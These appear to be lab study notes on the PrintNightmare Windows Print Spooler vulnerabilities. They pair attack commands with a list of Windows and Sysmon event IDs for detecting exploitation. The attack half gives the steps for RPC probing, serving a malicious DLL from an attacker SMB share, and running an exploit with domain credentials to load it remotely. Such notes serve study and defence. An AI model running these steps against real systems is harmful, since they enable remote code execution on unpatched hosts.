## Window Print Spooler Vulnerability
- managing the print jobs, receiving files to be printed, queueing them, and scheduling
- able to Start/Stop/Pause/Resume the Print Spooler Service in Service

```
rpcdump.py @10.10.56.87 | egrep 'MS-RPRN|MS-PAR'
```

#### the CVE-2021-1675 and CVE-2021-34527
- CVE-2021-1675 (need local access)
- Can remotely inject DLL (CVE-2021-34527)

- https://github.com/tryhackme/CVE-2021-1675.git

- Host SMB Share with malicious .dll file inside

```
smbserver.py share "/dir/to/share" -smb2support
```

- Run
```
./exploitCVE.py domain/domainuser:password@ip "/share/malicious.dll"
```

- Listen on .dll payload lhost lport

- Folder on victim to check
```
"C:\\Windows\\System32\\spool\\drivers\\x64\\3"
```


## BlueTeam Aspect

The logs related to Print Spooler Activity are:

    Microsoft-Windows-PrintService/Admin
    Microsoft-Windows-PrintService/Operational

We can detect the PrintNightmare artifacts by looking at the endpoint events or Windows Event Logs mentioned above.

You can look for the following Event IDs:

    Microsoft-Windows-PrintService/Operational (Event ID 316) - look for "Printer driver [file] for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, AddUser.dll, AddUser.dll. No user action is required.”
    Microsoft-Windows-PrintService/Admin (Event ID 808) - A security event source has attempted to register (can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
    Microsoft-Windows-PrintService/Operational (Event ID 811) - Logs the information regarding failed operations. The event will provide information about the full path of the dropped DLL.
    Microsoft-Windows-SMBClient/Security (Event ID 31017) - This Event ID can also be used to detect unsigned drivers loaded by spoolsv.exe.
    Windows System (Event ID 7031) - Service Stop Operations (This event ID will show you unexpected termination of print spooler service).

You can also use Sysmon to detect PrintNightmare terror: 

    Microsoft-Windows-Sysmon/Operational (Event ID 3) - Network connection (Look for suspicious ports)

    Microsoft-Windows-Sysmon/Operational (Event ID 11) - FileCreate (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: C:\Windows\System32\spool\drivers\x64\3)

    Microsoft-Windows-Sysmon/Operational (Event IDs 23, 26) - FileDelete (You can hunt for deleted malicious DLLs)
